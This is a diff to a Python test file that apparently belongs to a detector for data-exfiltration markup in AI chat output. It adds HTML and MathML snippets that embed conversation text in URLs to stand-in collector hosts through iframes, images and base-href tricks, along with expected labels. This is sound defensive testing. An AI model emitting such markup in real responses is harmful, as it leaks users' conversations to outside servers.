@@ -296,6 +296,27 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<video><source src='https://collector.test/{c}.mp4'></video>", ["exfiltration_query"]),
         ("<audio><source srcset='https://collector.test/{c}.mp3'></audio>", []),
         ("<source src='https://collector.test/{c}.mp4'>", []),
+        (
+            (
+                "<math><annotation-xml encoding='text/html'><iframe src='https://collector.test/{c}'></iframe>"
+                "</annotation-xml></math>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<math><annotation-xml encoding='application/xhtml+xml'><img src='https://collector.test/{c}.png'>"
+                "</annotation-xml></math>"
+            ),
+            ["exfiltration_query"],
+        ),
+        ("<math><annotation-xml><iframe src='https://collector.test/{c}'></iframe></annotation-xml></math>", []),
+        ("<base href='https://collector.test/?q={conversation}'><a href=''>send</a>", ["exfiltration_query"]),
+        ("<a href=''>x</a>", []),
+        ("<img src=''>", []),
+        ("<base href='\\\\collector.test\\'><img src='/{conversation}.png'>", ["exfiltration_query"]),
+        ("<base href='https://collector.test/'><img src='\\{c}.png'>", ["exfiltration_query"]),
+        ("<base href='javascript:x'><img src='/{c}.png'>", []),
         ("<image src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
         ("<svg><script href='https://collector.test/{c}.js'></script></svg>", ["exfiltration_query"]),
         ("<svg><script xlink:href='https://collector.test/{c}.js'></script></svg>", ["exfiltration_query"]),
